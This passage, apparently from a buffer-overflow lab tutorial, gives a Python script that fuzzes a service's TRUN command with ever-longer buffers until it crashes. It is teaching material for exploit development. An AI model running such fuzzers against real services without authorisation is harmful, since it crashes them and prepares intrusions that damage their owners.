Now that we know what the vulnerable function/command is, we can now 'fuzz' it in order to find the approximate memory location to where the program crashes.
In our example, the TRUN command/function was found to be vulnerable and thus we want to probe it with a set of simple buffers. 
You might need to modify the script with execution rights:

```python
#!/usr/bin/python3
 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        payload = "TRUN /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('TARGET-IP',TARGET-PORT))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
```

Once the program crashes, Control+C and check the bytes section.
